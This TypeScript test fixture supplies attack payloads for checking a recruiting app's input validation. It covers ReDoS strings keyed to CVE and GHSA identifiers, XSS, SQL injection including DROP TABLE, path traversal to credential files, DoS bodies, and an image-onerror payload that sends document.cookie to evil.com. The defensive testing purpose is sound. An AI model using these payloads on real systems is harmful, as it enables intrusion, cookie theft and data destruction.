/**
 * Security Attack Vectors for Testing
 *
 * This file contains various attack vectors to test against vulnerabilities:
 * - ReDoS (Regular Expression Denial of Service)
 * - XSS (Cross-Site Scripting)
 * - SQL Injection
 * - DoS (Denial of Service)
 * - Path Traversal
 * - CSRF tokens
 */

export interface AttackVector {
  name: string;
  description: string;
  payload: string;
  expectedBehavior: 'blocked' | 'sanitized' | 'rate-limited';
  vulnerability: string;
  severity: 'high' | 'moderate' | 'low';
}

// ReDoS Attack Vectors (targeting nth-check, body-parser, path-to-regexp vulnerabilities)
export const redosAttacks: AttackVector[] = [
  {
    name: 'nth-check ReDoS',
    description: 'CSS nth-check selector with exponential backtracking',
    payload: '2n' + ' '.repeat(50000) + '!',
    expectedBehavior: 'blocked',
    vulnerability: 'CVE-2021-3803',
    severity: 'high'
  },
  {
    name: 'path-to-regexp ReDoS',
    description: 'Route pattern with catastrophic backtracking',
    payload: '/api/users/' + 'a'.repeat(10000) + '!',
    expectedBehavior: 'blocked',
    vulnerability: 'CVE-2024-45296',
    severity: 'high'
  },
  {
    name: 'body-parser ReDoS',
    description: 'Large Content-Type header causing ReDoS',
    payload: 'application/x-www-form-urlencoded; ' + 'charset='.repeat(1000) + 'utf-8',
    expectedBehavior: 'blocked',
    vulnerability: 'CVE-2022-29078',
    severity: 'high'
  },
  {
    name: 'micromatch ReDoS',
    description: 'Glob pattern with exponential complexity',
    payload: 'a' + '*'.repeat(100) + 'b',
    expectedBehavior: 'blocked',
    vulnerability: 'CVE-2024-4067',
    severity: 'moderate'
  },
  {
    name: 'cross-spawn ReDoS',
    description: 'Command with nested parentheses causing exponential backtracking',
    payload: 'cmd' + '('.repeat(1000) + ')'.repeat(1000),
    expectedBehavior: 'blocked',
    vulnerability: 'GHSA-3xgq-45jj-v275',
    severity: 'high'
  },
  {
    name: 'babel RegExp ReDoS',
    description: 'Named capturing groups causing inefficient RegExp',
    payload: 'replace(' + '(?<name>'.repeat(1000) + 'x' + ')'.repeat(1000) + ', "")',
    expectedBehavior: 'blocked',
    vulnerability: 'GHSA-67hx-6x53-jw92',
    severity: 'moderate'
  }
];

// XSS Attack Vectors
export const xssAttacks: AttackVector[] = [
  {
    name: 'Script injection',
    description: 'Basic script tag injection',
    payload: '<script>alert("XSS")</script>',
    expectedBehavior: 'sanitized',
    vulnerability: 'XSS',
    severity: 'high'
  },
  {
    name: 'Event handler injection',
    description: 'HTML with malicious event handler',
    payload: '<img src="x" onerror="alert(\'XSS\')">',
    expectedBehavior: 'sanitized',
    vulnerability: 'XSS',
    severity: 'high'
  },
  {
    name: 'JavaScript URL',
    description: 'JavaScript protocol in href',
    payload: '<a href="javascript:alert(\'XSS\')">Click me</a>',
    expectedBehavior: 'sanitized',
    vulnerability: 'XSS',
    severity: 'high'
  },
  {
    name: 'Data URL with script',
    description: 'Data URL containing JavaScript',
    payload: '<iframe src="data:text/html,<script>alert(\'XSS\')</script>"></iframe>',
    expectedBehavior: 'sanitized',
    vulnerability: 'XSS',
    severity: 'high'
  }
];

// SQL Injection Attack Vectors
export const sqlInjectionAttacks: AttackVector[] = [
  {
    name: 'Union-based injection',
    description: 'UNION SELECT statement injection',
    payload: "1' UNION SELECT username, password FROM users--",
    expectedBehavior: 'blocked',
    vulnerability: 'SQL Injection',
    severity: 'high'
  },
  {
    name: 'Boolean-based blind injection',
    description: 'Boolean condition injection',
    payload: "1' AND (SELECT COUNT(*) FROM users) > 0--",
    expectedBehavior: 'blocked',
    vulnerability: 'SQL Injection',
    severity: 'high'
  },
  {
    name: 'Time-based blind injection',
    description: 'Time delay injection',
    payload: "1'; WAITFOR DELAY '00:00:05'--",
    expectedBehavior: 'blocked',
    vulnerability: 'SQL Injection',
    severity: 'high'
  },
  {
    name: 'Stacked queries',
    description: 'Multiple statement injection',
    payload: "1'; DROP TABLE users;--",
    expectedBehavior: 'blocked',
    vulnerability: 'SQL Injection',
    severity: 'high'
  }
];

// DoS Attack Vectors
export const dosAttacks: AttackVector[] = [
  {
    name: 'Large JSON payload',
    description: 'Extremely large JSON to consume memory',
    payload: JSON.stringify({ data: 'x'.repeat(1000000) }),
    expectedBehavior: 'rate-limited',
    vulnerability: 'DoS',
    severity: 'moderate'
  },
  {
    name: 'Deeply nested JSON',
    description: 'JSON with excessive nesting depth',
    payload: '{"a":'.repeat(10000) + '1' + '}'.repeat(10000),
    expectedBehavior: 'blocked',
    vulnerability: 'DoS',
    severity: 'high'
  },
  {
    name: 'Excessive field count',
    description: 'JSON with too many fields',
    payload: JSON.stringify(Object.fromEntries(Array.from({ length: 10000 }, (_, i) => [`field${i}`, 'value']))),
    expectedBehavior: 'blocked',
    vulnerability: 'DoS',
    severity: 'moderate'
  }
];

// Path Traversal Attack Vectors
export const pathTraversalAttacks: AttackVector[] = [
  {
    name: 'Directory traversal',
    description: 'Attempt to access parent directories',
    payload: '../../../etc/passwd',
    expectedBehavior: 'blocked',
    vulnerability: 'Path Traversal',
    severity: 'high'
  },
  {
    name: 'Encoded traversal',
    description: 'URL-encoded directory traversal',
    payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    expectedBehavior: 'blocked',
    vulnerability: 'Path Traversal',
    severity: 'high'
  },
  {
    name: 'Windows path traversal',
    description: 'Windows-style path traversal',
    payload: '..\\..\\..\\windows\\system32\\config\\sam',
    expectedBehavior: 'blocked',
    vulnerability: 'Path Traversal',
    severity: 'high'
  }
];

// New vulnerability-specific attack vectors (2024)
export const newVulnerabilityAttacks: AttackVector[] = [
  {
    name: 'rollup DOM Clobbering XSS',
    description: 'DOM clobbering in bundled scripts leading to XSS',
    payload: '<form><input name="eval"><input name="location"></form>',
    expectedBehavior: 'sanitized',
    vulnerability: 'GHSA-gcx4-mw62-g8wm',
    severity: 'high'
  },
  {
    name: 'webpack DOM Clobbering XSS',
    description: 'AutoPublicPathRuntimeModule DOM clobbering',
    payload: '<div id="__webpack_require__"><div id="publicPath">javascript:alert(1)</div></div>',
    expectedBehavior: 'sanitized',
    vulnerability: 'GHSA-4vvj-4cpr-p986',
    severity: 'moderate'
  },
  {
    name: 'http-proxy-middleware DoS',
    description: 'Denial of service through malformed proxy request',
    payload: JSON.stringify({
      target: 'http://localhost',
      headers: Object.fromEntries(Array.from({ length: 10000 }, (_, i) => [`header${i}`, 'value']))
    }),
    expectedBehavior: 'blocked',
    vulnerability: 'GHSA-c7hr-j4mj-j2w6',
    severity: 'high'
  },
  {
    name: 'ws DoS via headers',
    description: 'WebSocket DoS through excessive HTTP headers',
    payload: Array.from({ length: 1000 }, (_, i) => `X-Header-${i}: ${'x'.repeat(1000)}`).join('\r\n'),
    expectedBehavior: 'blocked',
    vulnerability: 'GHSA-3h5v-q93c-6h6q',
    severity: 'high'
  },
  {
    name: 'nanoid predictable generation',
    description: 'Predictable ID generation with non-integer values',
    payload: JSON.stringify({ size: 'invalid', alphabet: null }),
    expectedBehavior: 'blocked',
    vulnerability: 'GHSA-qrpm-p2h7-hrv2',
    severity: 'moderate'
  },
  {
    name: 'postcss line return parsing',
    description: 'CSS with malicious line return characters',
    payload: '@font-face{ font:(\\r/*);} malicious: code;',
    expectedBehavior: 'sanitized',
    vulnerability: 'CVE-2023-44270',
    severity: 'moderate'
  },
  {
    name: 'send template injection XSS',
    description: 'Template injection in send package',
    payload: '/files/{{7*7}}.txt',
    expectedBehavior: 'blocked',
    vulnerability: 'GHSA-m6fv-jmcg-4jfg',
    severity: 'low'
  },
  {
    name: 'serve-static template injection',
    description: 'Template injection in serve-static',
    payload: '/static/{{constructor.constructor("alert(1)")()}}',
    expectedBehavior: 'blocked',
    vulnerability: 'GHSA-cm22-4g7w-348p',
    severity: 'low'
  },
  {
    name: 'express XSS redirect',
    description: 'XSS via response.redirect()',
    payload: 'javascript:alert(document.domain)//\\@attacker.com',
    expectedBehavior: 'sanitized',
    vulnerability: 'GHSA-rv95-896h-c2vc',
    severity: 'low'
  },
  {
    name: 'cookie parsing OOB',
    description: 'Cookie with out-of-bounds characters',
    payload: 'name=value\x00; domain=\x01evil.com',
    expectedBehavior: 'blocked',
    vulnerability: 'GHSA-pxg6-pf52-xh8x',
    severity: 'low'
  },
  {
    name: 'brace-expansion ReDoS',
    description: 'Brace expansion with exponential complexity',
    payload: '{'.repeat(1000) + 'a,' + 'b'.repeat(1000) + '}'.repeat(1000),
    expectedBehavior: 'blocked',
    vulnerability: 'GHSA-ww39-953v-wcq6',
    severity: 'low'
  }
];

// Good test data (should pass validation)
export const goodTestData = {
  candidates: [
    {
      fullName: 'John Doe',
      email: 'john.doe@example.com',
      phone: '+1-555-123-4567',
      resumeContent: 'Experienced software engineer with 5 years in full-stack development...',
      skills: ['JavaScript', 'React', 'Node.js', 'PostgreSQL']
    },
    {
      fullName: 'Jane Smith',
      email: 'jane.smith@example.com',
      phone: '+1-555-987-6543',
      resumeContent: 'Senior frontend developer specializing in React and TypeScript...',
      skills: ['TypeScript', 'React', 'CSS', 'HTML5']
    },
    {
      fullName: 'María García',
      email: 'maria.garcia@example.com',
      phone: '+34-123-456-789',
      resumeContent: 'Desarrolladora full-stack con experiencia en aplicaciones web...',
      skills: ['Python', 'Django', 'JavaScript', 'PostgreSQL']
    }
  ],
  positions: [
    {
      title: 'Senior Software Engineer',
      description: 'Looking for an experienced software engineer to join our team...',
      requirements: ['5+ years experience', 'JavaScript proficiency', 'Team collaboration'],
      location: 'San Francisco, CA',
      salary: '$120,000 - $160,000'
    },
    {
      title: 'Frontend Developer',
      description: 'Seeking a creative frontend developer to build amazing user experiences...',
      requirements: ['React expertise', 'CSS/SCSS skills', 'Responsive design'],
      location: 'Remote',
      salary: '$80,000 - $120,000'
    }
  ],
  interviewStages: [
    'Initial Screening',
    'Technical Interview',
    'System Design',
    'Cultural Fit',
    'Final Round',
    'Offer Extended'
  ]
};

// Bad test data (should be blocked/sanitized)
export const badTestData = {
  candidates: [
    {
      fullName: '<script>alert("XSS")</script>',
      email: 'test"; DROP TABLE candidates; --',
      phone: '../../../etc/passwd',
      resumeContent: 'x'.repeat(1000000), // Too large
      skills: Array(10000).fill('skill') // Too many items
    },
    {
      fullName: '2n' + ' '.repeat(10000) + '!', // ReDoS attack
      email: 'javascript:alert("XSS")',
      phone: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      resumeContent: '<img src="x" onerror="fetch(\'http://evil.com/steal?data=\'+document.cookie)">',
      skills: ['<script>evil()</script>', 'normal skill']
    }
  ],
  maliciousRequests: [
    {
      method: 'POST',
      path: '/api/candidates',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded; ' + 'charset='.repeat(1000) + 'utf-8',
        'User-Agent': '<script>alert("XSS")</script>'
      },
      body: '{"data":' + '"x"'.repeat(50000) + '}'
    },
    {
      method: 'GET',
      path: '/api/candidates/../../../etc/passwd',
      headers: {
        'X-Forwarded-For': '127.0.0.1, 127.0.0.1, 127.0.0.1' // IP spoofing attempt
      }
    }
  ]
};

// Enhanced bad test data with new vulnerability patterns
export const enhancedBadTestData = {
  candidates: [
    // ...existing bad data...
    ...badTestData.candidates,
    // New vulnerability patterns
    {
      fullName: '<form><input name="eval"><input name="location"></form>',
      email: 'cmd' + '('.repeat(100) + ')'.repeat(100),
      phone: '/files/{{7*7}}.txt',
      resumeContent: '@font-face{ font:(\\r/*);} malicious: code;',
      skills: ['{'.repeat(100) + 'a,' + 'b'.repeat(100) + '}'.repeat(100)]
    },
    {
      fullName: '<div id="__webpack_require__"><div id="publicPath">javascript:alert(1)</div></div>',
      email: 'javascript:alert(document.domain)//\\@attacker.com',
      phone: 'name=value\x00; domain=\x01evil.com',
      resumeContent: 'replace(' + '(?<name>'.repeat(50) + 'x' + ')'.repeat(50) + ', "")',
      skills: ['DOM clobbering', 'webpack exploit']
    }
  ],
  maliciousRequests: [
    // ...existing bad requests...
    ...badTestData.maliciousRequests,
    // New vulnerability patterns
    {
      method: 'POST',
      path: '/api/proxy',
      headers: {
        'Cookie': 'name=value\x00; domain=\x01evil.com',
        ...Object.fromEntries(Array.from({ length: 50 }, (_, i) => [`X-Attack-${i}`, 'x'.repeat(100)]))
      },
      body: JSON.stringify({
        target: 'http://localhost',
        headers: Object.fromEntries(Array.from({ length: 100 }, (_, i) => [`header${i}`, 'value']))
      })
    },
    {
      method: 'GET',
      path: '/api/redirect',
      query: { url: 'javascript:alert(document.domain)//\\@attacker.com' }
    },
    {
      method: 'POST',
      path: '/api/template',
      body: {
        template: '/static/{{constructor.constructor("alert(1)")()}}',
        css: '@font-face{ font:(\\r/*);} malicious: code;'
      }
    }
  ]
};

// Update allAttackVectors to include new ones
export const allAttackVectors = [
  ...redosAttacks,
  ...xssAttacks,
  ...sqlInjectionAttacks,
  ...dosAttacks,
  ...pathTraversalAttacks,
  ...newVulnerabilityAttacks
];

// Export enhanced version as primary interface
export { enhancedBadTestData as badTestDataEnhanced };
